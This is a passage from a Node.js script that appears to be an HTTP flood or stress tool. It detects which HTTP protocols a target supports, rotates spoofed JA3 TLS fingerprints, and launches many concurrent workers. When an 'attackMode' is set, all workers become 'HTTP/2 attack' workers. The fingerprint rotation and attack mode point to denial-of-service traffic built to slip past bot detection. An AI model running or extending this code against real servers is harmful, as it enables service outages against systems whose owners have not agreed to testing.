        activeProtocols = argv.protocol.split(',').map(p => protocolMap[p.trim()]).filter(Boolean);
        if (activeProtocols.length === 0) {
            throw new Error('Invalid protocol(s) specified');
        }
    } else {
        console.log(chalk.cyan('🔍 Auto-detecting protocols...'));
        let detected = new Set();
        await new Promise(resolve => {
            const timeout = setTimeout(() => {
                console.log(chalk.yellow('Detection timeout, using HTTP/1.1'));
                if (!detected.has('h1')) detected.add('h1');
                resolve();
            }, CONFIG.PROTOCOL_DETECTION_TIMEOUT);

            const ja3Profile = argv.enableJa3 ? getJa3Profile(0) : JA3_PROFILES[0];
            const tlsOptions = createTlsOptions(ja3Profile);

            const req = https.request({
                method: 'HEAD', host: target.host, port: target.port, path: '/',
                ...tlsOptions
            }, res => {
                clearTimeout(timeout);
                const altSvc = res.headers['alt-svc'];
                if (altSvc && altSvc.includes('h3')) detected.add('h3');
                res.socket.destroy();
                resolve();
            });
            req.on('socket', socket => {
                socket.on('secureConnect', () => {
                    const alpn = socket.alpnProtocol;
                    if (alpn === 'h2') detected.add('h2');
                    else detected.add('h1');
                });
            });
            req.on('error', () => { 
                clearTimeout(timeout);
                detected.add('h1'); 
                resolve(); 
            });
            req.end();
        });
        activeProtocols = Array.from(detected);
        if (activeProtocols.length === 0) activeProtocols.push('h1');
    }
    console.log(chalk.green(`✓ Using protocols: ${activeProtocols.map(p => p.toUpperCase()).join(', ')}\n`));

    activeProtocols.forEach(p => {
        stats.protocolStats[p] = { responses: 0, statuses: {} };
    });

    const workerCounts = {};
    if (attackMode === 'none' && activeProtocols.length > 0) {
        const concPerProtocol = Math.floor(concurrency / activeProtocols.length);
        activeProtocols.forEach(p => workerCounts[p] = concPerProtocol);
        let remainder = concurrency % activeProtocols.length;
        for (let i = 0; i < remainder; i++) {
            workerCounts[activeProtocols[i]]++;
        }
    } else {
        workerCounts['h2'] = concurrency;
    }
    
    let workerId = 0;
    for (const protocolKey in workerCounts) {
        const count = workerCounts[protocolKey];
        for (let i = 0; i < count; i++) {
            if (attackMode !== 'none') {
                startHttp2AttackWorker();
            } else {
                let client;
                const ja3Profile = argv.enableJa3 ? getJa3Profile(workerId) : JA3_PROFILES[0];
                const tlsOptions = createTlsOptions(ja3Profile);
                
                if (protocolKey === 'h3') {
                    client = new Client(targetUrl, { connect: { ...tlsOptions } });
                } else if (protocolKey === 'h2') {
                    client = new Client(targetUrl, { connect: { ...tlsOptions } });
                } else {
                    client = new Client(targetUrl, { connect: { ...tlsOptions }, pipelining: 1 });
                }
                runStandardWorker(workerId++, client, protocolKey);
            }
        }
    }

    const monitorInterval = setInterval(updateMonitor, CONFIG.MONITOR_INTERVAL_MS);

    const testTimeout = setTimeout(async () => {
        isRunning = false;
        clearInterval(monitorInterval);
        await gracefulShutdown();
        updateMonitor();
        console.log(chalk.green.bold('\n✓ Test finished!\n'));
        process.exit(0);
    }, durationMs);

    process.on('SIGINT', async () => {
        isRunning = false;
        clearInterval(monitorInterval);
        clearTimeout(testTimeout);
        await gracefulShutdown();
        updateMonitor();
        console.log(chalk.red.bold('\n✗ Test interrupted by user.\n'));
        process.exit(1);
    });

    process.on('SIGTERM', async () => {
        isRunning = false;
        clearInterval(monitorInterval);
        clearTimeout(testTimeout);
        await gracefulShutdown();
        updateMonitor();
        console.log(chalk.red.bold('\n✗ Test terminated.\n'));
        process.exit(0);
    });
}

main().catch(err => {
    console.error(chalk.red('❌ Critical error:'), err.message);
    process.exit(1);
});
